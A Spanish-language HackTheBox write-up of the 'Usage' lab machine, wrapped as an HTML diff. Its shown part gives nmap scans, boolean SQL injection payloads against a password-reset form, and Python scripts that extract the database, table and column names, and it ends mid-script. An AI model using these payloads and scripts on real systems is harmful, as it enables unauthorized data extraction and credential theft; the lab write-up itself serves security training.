@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Usage Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina Linux de nivel Fácil de la plataforma HackTheBox, en la cual se toca SQLi">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Usage Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina Linux de nivel Fácil de la plataforma HackTheBox, en la cual se toca SQLi">
+
+<meta property="og:url" content="https://celero0.github.io/posts/usage/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Usage Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina Linux de nivel Fácil de la plataforma HackTheBox, en la cual se toca SQLi">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-28T05:30:45+00:00">
+    <meta property="article:modified_time" content="2026-01-28T05:30:45+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/usage/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/usage/">
+              Usage Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-01-28T05:30:45Z">
+                January 28, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              8-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Linux #Easy #SQLI</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Esta es una máquina Linux que aloja un servicio web vulnerable. En la funcionalidad de recuperación de contraseña se identifica una vulnerabilidad de SQL Injection, que mediante un ataque boolean-based permite enumerar la base de datos y extraer credenciales.</p>
+<p>Gracias a esto, se obtienen las credenciales del usuario administrador de un sitio alojado en un subdominio, el cual utiliza Laravel 10.18.0. Esta versión presenta una vulnerabilidad de subida de archivos, lo que permite cargar un archivo PHP malicioso y obtener ejecución remota de comandos como un usuario de bajos privilegios.</p>
+<p>Durante la enumeración del sistema se descubren credenciales almacenadas en texto plano, las cuales permiten pivotar hacia otro usuario. Dicho usuario posee permisos sudo para ejecutar un binario específico, el cual es vulnerable a lectura arbitraria de archivos. Aprovechando este comportamiento, es posible leer la clave privada SSH de root (<code>id_rsa</code>) y autenticarse como dicho usuario, comprometiendo completamente la máquina.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Realizamos un escaneo de puertos en la máquina víctima, encontrando el puerto <code>22</code> y  <code>80</code> abiertos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.129.5.224 -oG allPorts
+</span></span></code></pre></div><p>Para obtener mayor información acerca de los servicios y versiones, realizamos el siguiente escaneo</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80 -sCV 10.129.5.224 -oN portServices
+</span></span></code></pre></div><p>Teniendo los siguientes resultados, viendo un redirect hacia <code>usage.htb</code></p>
+<img src="/images/Pasted image 20260126210320.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>añadimos el dominio en nuestro <code>/etc/hosts</code></p>
+<img src="/images/Pasted image 20260126210411.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-servicio-http">
+  Enumeración servicio HTTP
+  <a class="heading-link" href="#enumeraci%c3%b3n-servicio-http">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Vemos la página principal, que tiene un <code>login</code>, <code>register</code>,<code>reset password</code> y <code>admin</code></p>
+<img src="/images/Pasted image 20260126210830.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En el apartado de <code>admin</code>, nos muestra un subdominio que debemos agregar en nuestro <code>/etc/hosts</code></p>
+<img src="/images/Pasted image 20260126210944.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>El subdominio <code>admin.usage.htb</code> nos muestra una página de login, la cual pide usuario y contraseña</p>
+<img src="/images/Pasted image 20260126211031.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="sqli-manual-con-python">
+  SQLI manual con Python
+  <a class="heading-link" href="#sqli-manual-con-python">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Probando entre las diferentes rutas, encontramos que <code>/forget-password</code> es vulnerable a #SQLI</p>
+<p>Vemos que la petición normal nos arroja como respuesta el mensaje <code>Email address does not match in our records!</code></p>
+<img src="/images/Pasted image 20260128000804.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si mandamos una comilla en el parámetro <code>email</code>, nos devuelve un código 500 <code>SERVER ERROR</code></p>
+<img src="/images/Pasted image 20260128000845.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="sqli-boolean">
+  SQLi Boolean
+  <a class="heading-link" href="#sqli-boolean">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Ahora probaremos el siguiente payload para ver si es vulnerable a un ataque booleano</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">_token</span><span style="color:#ff7b72;font-weight:bold">=</span>gVqHnJ7IHMmT9KS4Bhja4uTQf7srmPDpg06Jemwc&amp;<span style="color:#79c0ff">email</span><span style="color:#ff7b72;font-weight:bold">=</span>admin%40admin.htb<span style="color:#a5d6ff">&#39; or &#39;</span>1<span style="color:#a5d6ff">&#39;=&#39;</span>1<span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><p>Teniendo como respuesta que acepta la petición</p>
+<img src="/images/Pasted image 20260128001034.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora mandaremos lo mismo, pero con una igualdad errónea, buscando el mensaje de error</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">_token</span><span style="color:#ff7b72;font-weight:bold">=</span>gVqHnJ7IHMmT9KS4Bhja4uTQf7srmPDpg06Jemwc&amp;<span style="color:#79c0ff">email</span><span style="color:#ff7b72;font-weight:bold">=</span>admin%40admin.htb<span style="color:#a5d6ff">&#39; or &#39;</span>1<span style="color:#a5d6ff">&#39;=&#39;</span>2<span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><p>y el mensaje de error es el que vimos anteriormente</p>
+<img src="/images/Pasted image 20260128001117.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Teniendo una respuesta diferente cuando la petición es exitosa y cuando no, es una vía potencial para realizar enumeración de la base de datos mediante SQLi Booleana</p>
+<h2 id="obtener-base-de-datos">
+  Obtener Base de datos
+  <a class="heading-link" href="#obtener-base-de-datos">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para obtener el nombre de la base de datos tenemos el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; or substring(database(),1,1)=&#39;</span>a<span style="color:#f85149">&#39;</span>-- -
+</span></span></code></pre></div><p>El cual nos mostrará el mensaje <code>We have</code>&hellip; cuando encontramos el carácter correcto</p>
+<p>Si probamos si el primer valor de el nombre de la base de datos es <code>a</code>, nos aparece un error, pero si probamos si el primer valor es <code>u</code>, nos devuelve el mensaje exitoso.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">_token</span><span style="color:#ff7b72;font-weight:bold">=</span>gVqHnJ7IHMmT9KS4Bhja4uTQf7srmPDpg06Jemwc&amp;<span style="color:#79c0ff">email</span><span style="color:#ff7b72;font-weight:bold">=</span>admin%40admin.htb<span style="color:#a5d6ff">&#39; or substring(database(),1,1)=&#39;</span>u<span style="color:#f85149">&#39;</span>--+-
+</span></span></code></pre></div><img src="/images/Pasted image 20260128001529.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto podemos realizar un script en python que itere los valores de posición y el de caracteres.</p>
+<p>Teniendo el siguiente script</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">re</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>baseURL <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://usage.htb&#34;</span>
+</span></span><span style="display:flex;"><span>param <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/forget-password&#34;</span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#ff7b72;font-weight:bold">=</span> string<span style="color:#ff7b72;font-weight:bold">.</span>ascii_letters <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>digits <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>punctuation
+</span></span><span style="display:flex;"><span>box <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener cookies</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener CSRF </span>
+</span></span><span style="display:flex;"><span>r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>get(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param)
+</span></span><span style="display:flex;"><span>token <span style="color:#ff7b72;font-weight:bold">=</span> re<span style="color:#ff7b72;font-weight:bold">.</span>search(<span style="color:#79c0ff">r</span><span style="color:#a5d6ff">&#39;name=&#34;_token&#34; value=&#34;(.*?)&#34;&#39;</span>, r<span style="color:#ff7b72;font-weight:bold">.</span>text)<span style="color:#ff7b72;font-weight:bold">.</span>group(<span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;[+] CSRF:&#34;</span>, token)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;[+] Cookies:&#34;</span>, s<span style="color:#ff7b72;font-weight:bold">.</span>cookies)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> pos <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">1</span>,<span style="color:#a5d6ff">11</span>):
+</span></span><span style="display:flex;"><span>   <span style="color:#ff7b72">for</span> char <span style="color:#ff7b72;font-weight:bold">in</span> (characters):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;or substring(database(),</span><span style="color:#a5d6ff">{</span>pos<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">,1)=&#39;</span><span style="color:#a5d6ff">{</span>char<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#39;-- -&#34;</span>
+</span></span><span style="display:flex;"><span>      data <span style="color:#ff7b72;font-weight:bold">=</span> {<span style="color:#a5d6ff">&#34;_token&#34;</span>:token,<span style="color:#a5d6ff">&#34;email&#34;</span>:<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;admin@admin.htb&#39; </span><span style="color:#a5d6ff">{</span>payload<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>}
+</span></span><span style="display:flex;"><span>      r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>post(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param,json<span style="color:#ff7b72;font-weight:bold">=</span>data)
+</span></span><span style="display:flex;"><span>      print(payload)
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> <span style="color:#a5d6ff">&#34;We have&#34;</span> <span style="color:#ff7b72;font-weight:bold">in</span> r<span style="color:#ff7b72;font-weight:bold">.</span>text:
+</span></span><span style="display:flex;"><span>         os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;clear&#34;</span>)
+</span></span><span style="display:flex;"><span>         box <span style="color:#ff7b72;font-weight:bold">=</span> box <span style="color:#ff7b72;font-weight:bold">+</span> char
+</span></span><span style="display:flex;"><span>         print(box)
+</span></span><span style="display:flex;"><span>         <span style="color:#ff7b72">break</span>
+</span></span></code></pre></div><p>Obtenemos que el nombre de la base de datos es <code>usage_blog</code></p>
+<h2 id="obtener-tablas">
+  Obtener Tablas
+  <a class="heading-link" href="#obtener-tablas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para obtener las tablas de la base de datos, tenemos el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>or substring<span style="color:#ff7b72;font-weight:bold">((</span><span style="color:#ff7b72">select</span> group_concat<span style="color:#ff7b72;font-weight:bold">(</span>table_name<span style="color:#ff7b72;font-weight:bold">)</span> from information_schema.tables where <span style="color:#79c0ff">table_schema</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;usage_blog&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>,1,1<span style="color:#ff7b72;font-weight:bold">)=</span><span style="color:#a5d6ff">&#39;a&#39;</span>--+-
+</span></span></code></pre></div><p>Al igual que con la base de datos, podemos realizar un script en Python que nos dé el nombre de todas las tablas.</p>
+<p>El siguiente script permite conseguir el nombre de todas las tablas de la base de datos anteriormente encontrada</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">re</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>baseURL <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://usage.htb&#34;</span>
+</span></span><span style="display:flex;"><span>param <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/forget-password&#34;</span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#ff7b72;font-weight:bold">=</span> string<span style="color:#ff7b72;font-weight:bold">.</span>ascii_letters <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>digits <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>punctuation
+</span></span><span style="display:flex;"><span>box <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener cookies</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener CSRF </span>
+</span></span><span style="display:flex;"><span>r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>get(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param)
+</span></span><span style="display:flex;"><span>token <span style="color:#ff7b72;font-weight:bold">=</span> re<span style="color:#ff7b72;font-weight:bold">.</span>search(<span style="color:#79c0ff">r</span><span style="color:#a5d6ff">&#39;name=&#34;_token&#34; value=&#34;(.*?)&#34;&#39;</span>, r<span style="color:#ff7b72;font-weight:bold">.</span>text)<span style="color:#ff7b72;font-weight:bold">.</span>group(<span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;[+] CSRF:&#34;</span>, token)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;[+] Cookies:&#34;</span>, s<span style="color:#ff7b72;font-weight:bold">.</span>cookies)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> pos <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">1</span>,<span style="color:#a5d6ff">300</span>):
+</span></span><span style="display:flex;"><span>   <span style="color:#ff7b72">for</span> char <span style="color:#ff7b72;font-weight:bold">in</span> (characters):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;or substring((select group_concat(table_name) from information_schema.tables where table_schema=&#39;usage_blog&#39;),</span><span style="color:#a5d6ff">{</span>pos<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">,1)=&#39;</span><span style="color:#a5d6ff">{</span>char<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#39;-- -&#34;</span>
+</span></span><span style="display:flex;"><span>      data <span style="color:#ff7b72;font-weight:bold">=</span> {<span style="color:#a5d6ff">&#34;_token&#34;</span>:token,<span style="color:#a5d6ff">&#34;email&#34;</span>:<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;admin@admin.htb&#39; </span><span style="color:#a5d6ff">{</span>payload<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>}
+</span></span><span style="display:flex;"><span>      r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>post(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param,json<span style="color:#ff7b72;font-weight:bold">=</span>data)
+</span></span><span style="display:flex;"><span>      print(payload)
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> <span style="color:#a5d6ff">&#34;We have&#34;</span> <span style="color:#ff7b72;font-weight:bold">in</span> r<span style="color:#ff7b72;font-weight:bold">.</span>text:
+</span></span><span style="display:flex;"><span>         os<span style="color:#ff7b72;font-weight:bold">.</span>system(<span style="color:#a5d6ff">&#34;clear&#34;</span>)
+</span></span><span style="display:flex;"><span>         box <span style="color:#ff7b72;font-weight:bold">=</span> box <span style="color:#ff7b72;font-weight:bold">+</span> char
+</span></span><span style="display:flex;"><span>         print(box)
+</span></span><span style="display:flex;"><span>         <span style="color:#ff7b72">break</span>
+</span></span></code></pre></div><p>Encontramos muchas tablas, pero la más interesante es la tabla <code>admin_users</code></p>
+<img src="/images/Pasted image 20260128010450.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h2 id="obtener-las-columnas">
+  Obtener las columnas
+  <a class="heading-link" href="#obtener-las-columnas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Para obtener las columnas de la tabla <code>admin_users</code>, tenemos el siguiente payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>or substring<span style="color:#ff7b72;font-weight:bold">((</span><span style="color:#ff7b72">select</span> group_concat<span style="color:#ff7b72;font-weight:bold">(</span>column_name<span style="color:#ff7b72;font-weight:bold">)</span> from information_schema.columns where <span style="color:#79c0ff">table_schema</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;usage_blog&#39;</span> and <span style="color:#79c0ff">table_name</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#39;admin_users&#39;</span><span style="color:#ff7b72;font-weight:bold">)</span>,1,1<span style="color:#ff7b72;font-weight:bold">)=</span><span style="color:#a5d6ff">&#39;a&#39;</span>--+-
+</span></span></code></pre></div><p>El siguiente en Python script permite encontrar las columnas de la tabla <code>admin_users</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">re</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>baseURL <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;http://usage.htb&#34;</span>
+</span></span><span style="display:flex;"><span>param <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;/forget-password&#34;</span>
+</span></span><span style="display:flex;"><span>characters <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;,&#34;</span> <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>ascii_letters <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>digits <span style="color:#ff7b72;font-weight:bold">+</span> string<span style="color:#ff7b72;font-weight:bold">.</span>punctuation
+</span></span><span style="display:flex;"><span>box <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener cookies</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#ff7b72;font-weight:bold">=</span> requests<span style="color:#ff7b72;font-weight:bold">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Obtener CSRF</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>get(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param)
+</span></span><span style="display:flex;"><span>token <span style="color:#ff7b72;font-weight:bold">=</span> re<span style="color:#ff7b72;font-weight:bold">.</span>search(<span style="color:#79c0ff">r</span><span style="color:#a5d6ff">&#39;name=&#34;_token&#34; value=&#34;(.*?)&#34;&#39;</span>, r<span style="color:#ff7b72;font-weight:bold">.</span>text)<span style="color:#ff7b72;font-weight:bold">.</span>group(<span style="color:#a5d6ff">1</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;[+] CSRF:&#34;</span>, token)
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&#34;[+] Cookies:&#34;</span>, s<span style="color:#ff7b72;font-weight:bold">.</span>cookies)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> pos <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">1</span>,<span style="color:#a5d6ff">300</span>):
+</span></span><span style="display:flex;"><span>   <span style="color:#ff7b72">for</span> char <span style="color:#ff7b72;font-weight:bold">in</span> (characters):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      payload <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;or substring((select group_concat(column_name) from information_schema.columns where table_schema=&#39;usage_blog&#39; and table_name=&#39;admin_users&#39;),</span><span style="color:#a5d6ff">{</span>pos<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">,1)=&#39;</span><span style="color:#a5d6ff">{</span>char<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#39;-- -&#34;</span>
+</span></span><span style="display:flex;"><span>      data <span style="color:#ff7b72;font-weight:bold">=</span> {<span style="color:#a5d6ff">&#34;_token&#34;</span>:token,<span style="color:#a5d6ff">&#34;email&#34;</span>:<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;admin@admin.htb&#39; </span><span style="color:#a5d6ff">{</span>payload<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>}
+</span></span><span style="display:flex;"><span>      r <span style="color:#ff7b72;font-weight:bold">=</span> s<span style="color:#ff7b72;font-weight:bold">.</span>post(baseURL <span style="color:#ff7b72;font-weight:bold">+</span> param,json<span style="color:#ff7b72;font-weight:bold">=</span>data)
+</span></span><span style="display:flex;"><span>      print(payload)
